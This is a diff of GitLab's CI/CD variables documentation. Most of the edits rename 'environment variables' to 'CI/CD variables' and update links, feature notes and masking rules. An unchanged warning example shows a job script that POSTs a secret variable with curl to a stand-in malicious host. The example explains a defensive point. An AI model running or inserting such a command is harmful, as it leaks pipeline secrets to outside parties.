@@ -5,20 +5,15 @@ info: To determine the technical writer assigned to the Stage/Group associated w
 type: reference
 ---
 
-# GitLab CI/CD environment variables
+# GitLab CI/CD variables
 
-An environment variable is a dynamically-named value that can
-affect the way running processes behave on an operating
-system.
+CI/CD variables are part of the environment in which [pipelines](../pipelines/index.md)
+and jobs run. For example, you could:
 
-Environment variables are part of the environment in which a process runs.
-For example, a running process could:
-
-- Use the value of a `TEMP` environment variable to know the correct location
-  to store temporary files.
+- Use the value of a `TEMP` variable to know the correct location to store temporary files.
 - Use a `DATABASE_URL` variable for the URL to a database that can be reused in different scripts.
 
-Variables are useful for customizing your jobs in GitLab CI/CD.
+Variables can be used to customize your jobs in [GitLab CI/CD](../README.md).
 When you use variables, you don't have to hard-code values.
 
 > For more information about advanced use of GitLab CI/CD:
@@ -28,28 +23,27 @@ When you use variables, you don't have to hard-code values.
 > - <i class="fa fa-youtube-play youtube" aria-hidden="true"></i>&nbsp;Learn how the Cloud Native Computing Foundation (CNCF) [eliminates the complexity](https://about.gitlab.com/customers/cncf/)
 >   of managing projects across many cloud providers with GitLab CI/CD.
 
-## Predefined environment variables
+## Predefined CI/CD variables
 
-GitLab CI/CD has a [default set of predefined variables](predefined_variables.md)
+GitLab CI/CD has a [default set of predefined CI/CD variables](predefined_variables.md)
 that you can use without any additional specification.
 You can call issue numbers, user names, branch names,
 pipeline and commit IDs, and much more.
 
-Predefined environment variables are provided by GitLab
-for the local environment of the runner.
+Predefined variables are provided by GitLab for the local environment of the runner.
 
 GitLab reads the `.gitlab-ci.yml` file and sends the information
 to the runner, where the variables are exposed. The runner then runs the script commands.
 
-### Use predefined environment variables
+### Use predefined CI/CD variables
 
-You can choose one of the existing predefined variables
+You can choose one of the existing predefined CI/CD variables
 to be output by the runner.
 
 This example shows how to output a job's stage by using the predefined variable `CI_JOB_STAGE`.
 
 In your `.gitlab-ci.yml` file, call the variable from your script. Ensure
-you use the correct [syntax](#syntax-of-environment-variables-in-job-scripts).
+you use the correct [syntax](#syntax-of-cicd-variables-in-job-scripts).
 
 ```yaml
 test_variable:
@@ -63,14 +57,15 @@ job `test_variable`, which is `test`:
 
 ![Output `$CI_JOB_STAGE`](img/ci_job_stage_output_example.png)
 
-## Custom environment variables
+## Custom CI/CD variables
 
-When you need a specific custom environment variable, you can
+When you need a specific custom variable, you can
 [set it up in the UI](#create-a-custom-variable-in-the-ui), in [the API](../../api/project_level_variables.md),
 or directly [in the `.gitlab-ci.yml` file](#create-a-custom-variable-in-gitlab-ciyml).
 
 The variables are used by the runner any time the pipeline runs.
-You can also [override variable values manually for a specific pipeline](../jobs/index.md#specifying-variables-when-running-manual-jobs).
+You can also [override variable values manually for a specific pipeline](../jobs/index.md#specifying-variables-when-running-manual-jobs),
+or have them [prefilled in manual pipelines](../pipelines/index.md#prefill-variables-in-manual-pipelines).
 
 There are two types of variables: **Variable** and **File**. You cannot set types in
 the `.gitlab-ci.yml` file, but you can set them in the UI and API.
@@ -96,7 +91,7 @@ For more details, see [`.gitlab-ci.yml` defined variables](#gitlab-ciyml-defined
 
 ### Create a custom variable in the UI
 
-From within the UI, you can add or update custom environment variables:
+From the UI, you can add or update custom variables:
 
 1. Go to your project's **Settings > CI/CD** and expand the **Variables** section.
 1. Click the **Add Variable** button. In the **Add variable** modal, fill in the details:
@@ -104,7 +99,7 @@ From within the UI, you can add or update custom environment variables:
     - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
     - **Value**: No limitations.
     - **Type**: `File` or `Variable`.
-    - **Environment scope**: `All`, or specific environments.
+    - **Environment scope**: `All`, or specific [environments](../environments/index.md).
     - **Protect variable** (Optional): If selected, the variable is only available in pipelines that run on protected branches or tags.
     - **Mask variable** (Optional): If selected, the variable's **Value** is masked in job logs. The variable fails to save if the value does not meet the [masking requirements](#masked-variable-requirements).
 
@@ -145,7 +140,7 @@ build:
     - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
 ```
 
-### Custom environment variables of type Variable
+### Custom CI/CD variables of type Variable
 
 > [Introduced](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/46806) in GitLab 11.11.
 
@@ -155,7 +150,7 @@ that uses the key for the name and the value for the value.
 There are [some predefined variables](#custom-variables-validated-by-gitlab) of this type,
 which may be further validated. They appear when you add or update a variable in the UI.
 
-### Custom environment variables of type File
+### Custom CI/CD variables of type File
 
 > [Introduced](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/46806) in GitLab 11.11.
 
@@ -207,10 +202,11 @@ The value of the variable must:
 
 - Be in a single line.
 - Be at least 8 characters long.
-- Not be a predefined or custom environment variable.
-- Consist only of characters from the Base64 alphabet (RFC4648).
-  [In GitLab 12.2](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/63043)
-  and newer, `@` and `:` are also valid values.
+- Not be a predefined or custom CI/CD variable.
+- Consist only of:
+  - Characters from the Base64 alphabet (RFC4648).
+  - The `@` and `:` characters ([In GitLab 12.2](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/63043) and later).
+  - The `.` character ([In GitLab 12.10](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/29022) and later).
 
 You can't mask variables that don't meet these requirements.
 
@@ -247,7 +243,7 @@ WARNING:
 When you store credentials, there are security implications. If you are using AWS keys,
 for example, follow their [best practices](https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html).
 
-## Syntax of environment variables in job scripts
+## Syntax of CI/CD variables in job scripts
 
 All variables are set as environment variables in the build environment, and
 they are accessible with normal methods that are used to access such variables.
@@ -263,7 +259,7 @@ To access environment variables, use the syntax for your runner's [shell](https:
 
 ### Bash
 
-To access environment variables in **bash**, prefix the variable name with (`$`):
+To access environment variables in **bash**, prefix the CI/CD variable name with (`$`):
 
 ```yaml
 job_name:
@@ -274,8 +270,8 @@ job_name:
 ### PowerShell
 
 To access variables in a **Windows PowerShell** environment, including system set
-environment variables, prefix the variable name with (`$env:`). Environment variables
-set by GitLab CI can also be accessed by prefixing the variable name with (`$`) with
+environment variables, prefix the variable name with (`$env:`). GitLab CI/CD variables
+can also be accessed by prefixing the variable name with (`$`) with
 [GitLab Runner 1.0.0](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/68)
 and later.
 
@@ -371,9 +367,8 @@ export GITLAB_USER_ID="42"
 
 ## `.gitlab-ci.yml` defined variables
 
-You can add variables that are set in the build environment to `.gitlab-ci.yml`.
-These variables are saved in the repository, and they
-are meant to store non-sensitive project configuration, like `RAILS_ENV` or
+You can add CI/CD variables to `.gitlab-ci.yml`. These variables are saved in the repository,
+and they are meant to store non-sensitive project configuration, like `RAILS_ENV` or
 `DATABASE_URL`.
 
 For example, if you set the variable below globally (not inside a job), it is
@@ -406,13 +401,20 @@ script:
   - 'eval $LS_CMD'  # will execute 'ls -al $TMP_DIR'
 ```
 
-## Group-level environment variables
+Use the [`value` and `description`](../yaml/README.md#prefill-variables-in-manual-pipelines)
+keywords to define [variables that are prefilled](../pipelines/index.md#prefill-variables-in-manual-pipelines)
+when [running a pipeline manually](../pipelines/index.md#run-a-pipeline-manually):
+
+## Group-level CI/CD variables
 
 > Introduced in GitLab 9.4.
 
-You can define per-project or per-group variables that are set in the pipeline environment. Group-level variables are stored out of the repository (not in `.gitlab-ci.yml`). They are securely passed to GitLab Runner, which makes them available during a pipeline run.
+You can define per-project or per-group variables that are set in the pipeline environment.
+Group-level variables are stored out of the repository (not in `.gitlab-ci.yml`).
+They are securely passed to GitLab Runner, which makes them available during a pipeline run.
 
-We recommend using group environment variables to store secrets (like passwords, SSH keys, and credentials) for Premium users who:
+We recommend using group variables to store secrets (like passwords, SSH keys, and
+credentials) for users who:
 
 - Do **not** use an external key store.
 - Use the GitLab [integration with HashiCorp Vault](../secrets/index.md).
@@ -430,7 +432,7 @@ After you set them, they are available for all subsequent pipelines. Any group-l
 
 ![CI/CD settings - inherited variables](img/inherited_group_variables_v12_5.png)
 
-## Instance-level CI/CD environment variables
+## Instance-level CI/CD variables
 
 > [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/14108) in GitLab 13.0.
 
@@ -471,12 +473,12 @@ To enable it:
 Feature.enable(:instance_variables_ui)
 ```
 
-## Inherit environment variables
+## Inherit CI/CD variables
 
 > - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/22638) in GitLab 13.0 behind a disabled [feature flag](../../administration/feature_flags.md): `ci_dependency_variables`.
 > - [Feature flag removed](https://gitlab.com/gitlab-org/gitlab/-/issues/217834) in GitLab 13.1.
 
-You can inherit environment variables from dependent jobs.
+You can inherit CI/CD variables from dependent jobs.
 
 This feature makes use of the [`artifacts:reports:dotenv`](../pipelines/job_artifacts.md#artifactsreportsdotenv) report feature.
 
@@ -519,7 +521,7 @@ deploy:
       artifacts: true
 ```
 
-## Priority of environment variables
+## Priority of CI/CD variables
 
 Variables of different types can take precedence over other
 variables, depending on where they are defined.
@@ -528,14 +530,14 @@ The order of precedence for variables is (from highest to lowest):
 
 1. [Trigger variables](../triggers/README.md#making-use-of-trigger-variables), [scheduled pipeline variables](../pipelines/schedules.md#using-variables),
    and [manual pipeline run variables](#override-a-variable-by-manually-running-a-pipeline).
-1. Project-level [variables](#custom-environment-variables) or [protected variables](#protect-a-custom-variable).
-1. Group-level [variables](#group-level-environment-variables) or [protected variables](#protect-a-custom-variable).
-1. Instance-level [variables](#instance-level-cicd-environment-variables) or [protected variables](#protect-a-custom-variable).
-1. [Inherited environment variables](#inherit-environment-variables).
+1. Project-level [variables](#custom-cicd-variables) or [protected variables](#protect-a-custom-variable).
+1. Group-level [variables](#group-level-cicd-variables) or [protected variables](#protect-a-custom-variable).
+1. Instance-level [variables](#instance-level-cicd-variables) or [protected variables](#protect-a-custom-variable).
+1. [Inherited CI/CD variables](#inherit-cicd-variables).
 1. YAML-defined [job-level variables](../yaml/README.md#variables).
 1. YAML-defined [global variables](../yaml/README.md#variables).
-1. [Deployment variables](#deployment-environment-variables).
-1. [Predefined environment variables](predefined_variables.md).
+1. [Deployment variables](#deployment-variables).
+1. [Predefined CI/CD variables](predefined_variables.md).
 
 For example, if you define:
 
@@ -549,7 +551,7 @@ variables take precedence over those defined in `.gitlab-ci.yml`.
 
 Variable names are limited by the underlying shell used to execute scripts (see [available shells](https://docs.gitlab.com/runner/shells/index.html).
 Each shell has its own unique set of reserved variable names.
-Keep in mind the [scope of environment variables](where_variables_can_be_used.md) to ensure a variable is defined in the scope in which you wish to use it.
+Keep in mind the [scope of CI/CD variables](where_variables_can_be_used.md) to ensure a variable is defined in the scope in which you wish to use it.
 
 ## Where variables can be used
 
@@ -557,14 +559,14 @@ Keep in mind the [scope of environment variables](where_variables_can_be_used.md
 
 ## Advanced use
 
-### Limit the environment scopes of environment variables
+### Limit the environment scopes of CI/CD variables
 
 You can limit the environment scope of a variable by
 [defining which environments](../environments/index.md) it can be available for.
 
 To learn more about scoping environments, see [Scoping environments with specs](../environments/index.md#scoping-environments-with-specs).
 
-### Deployment environment variables
+### Deployment variables
 
 > Introduced in GitLab 8.15.
 
@@ -582,11 +584,10 @@ An example integration that defines deployment variables is the
 > [Introduced](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/49056) in GitLab 11.7.
 
 You can configure [Auto DevOps](../../topics/autodevops/index.md) to
-pass CI variables to the running application by prefixing the key of the
+pass CI/CD variables to the running application by prefixing the key of the
 variable with `K8S_SECRET_`.
 
-These [prefixed
-variables](../../topics/autodevops/customize.md#application-secret-variables) are
+These [prefixed variables](../../topics/autodevops/customize.md#application-secret-variables) are
 then available as environment variables on the running application
 container.
 
@@ -603,9 +604,9 @@ You can override the value of a variable when:
 1. Manually playing a job via the UI.
 1. Using [push options](../../user/project/push_options.md#push-options-for-gitlab-cicd).
 1. Manually triggering pipelines with [the API](../triggers/README.md#making-use-of-trigger-variables).
-1. Passing variables to a [downstream pipeline](../multi_project_pipelines.md#passing-variables-to-a-downstream-pipeline).
+1. Passing variables to a [downstream pipeline](../multi_project_pipelines.md#passing-cicd-variables-to-a-downstream-pipeline).
 
-These pipeline variables declared in these events take [priority over other variables](#priority-of-environment-variables).
+These pipeline variables declared in these events take [priority over other variables](#priority-of-cicd-variables).
 
 #### Restrict who can override variables
 
@@ -618,7 +619,7 @@ variables, an `Insufficient permissions to set pipeline variables` error occurs.
 
 The setting is `disabled` by default.
 
-If you [store your CI configurations in a different repository](../../ci/pipelines/settings.md#custom-ci-configuration-path),
+If you [store your CI/CD configurations in a different repository](../../ci/pipelines/settings.md#custom-cicd-configuration-path),
 use this setting for strict control over all aspects of the environment
 the pipeline runs in.
 
@@ -642,7 +643,7 @@ value for this specific pipeline.
 
 ![Manually overridden variable output](img/override_value_via_manual_pipeline_output.png)
 
-## Environment variables expressions
+## CI/CD variable expressions
 
 > - [Introduced](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/37397) in GitLab 10.7 for [the `only` and `except` CI keywords](../yaml/README.md#onlyexcept-advanced)
 > - [Expanded](https://gitlab.com/gitlab-org/gitlab/-/issues/27863) in GitLab 12.3 with [the `rules` keyword](../yaml/README.md#rules)
@@ -676,7 +677,7 @@ when `except` is being used, a job is not created.
 
 This follows the usual rules for [`only` / `except` policies](../yaml/README.md#onlyexcept-advanced).
 
-### Syntax of environment variable expressions
+### Syntax of CI/CD variable expressions
 
 Below you can find supported syntax reference.
 
@@ -777,7 +778,7 @@ so `&&` is evaluated before `||`.
 > - It's deployed behind a feature flag, enabled by default.
 > - It's enabled on GitLab.com.
 > - It's recommended for production use.
-> - For GitLab self-managed instances, GitLab administrators can opt to [disable it](#enable-or-disable-parenthesis-support-for-variables). **(CORE ONLY)**
+> - For GitLab self-managed instances, GitLab administrators can opt to [disable it](#enable-or-disable-parenthesis-support-for-variables). **(FREE SELF)**
 
 It is possible to use parentheses to group conditions. Parentheses have the highest
 precedence of all operators. Expressions enclosed in parentheses are evaluated first,
@@ -793,7 +794,7 @@ Examples:
 - `($VARIABLE1 =~ /^content.*/ || $VARIABLE2 =~ /thing$/) && $VARIABLE3`
 - `$CI_COMMIT_BRANCH == "my-branch" || (($VARIABLE1 == "thing" || $VARIABLE2 == "thing") && $VARIABLE3)`
 
-##### Enable or disable parenthesis support for variables **(CORE ONLY)**
+##### Enable or disable parenthesis support for variables **(FREE SELF)**
 
 The feature is deployed behind a feature flag that is **enabled by default**.
 [GitLab administrators with access to the GitLab Rails console](../../administration/feature_flags.md)
@@ -1076,7 +1077,7 @@ if [[ -d "/builds/gitlab-examples/ci-debug-trace/.git" ]]; then
 
 ## Video walkthrough of a working example
 
-The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck) video is a walkthrough of the [Complex Config Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo) working example project. It explains how multiple levels of group CI/CD variables can be combined with environment-scoped project variables for complex configuration of application builds or deployments.
+The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck) video is a walkthrough of the [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo) working example project. It explains how multiple levels of group CI/CD variables can be combined with environment-scoped project variables for complex configuration of application builds or deployments.
 
 The example can be copied to your own group or instance for testing. More details
 on what other GitLab CI patterns are demonstrated are available at the project page.
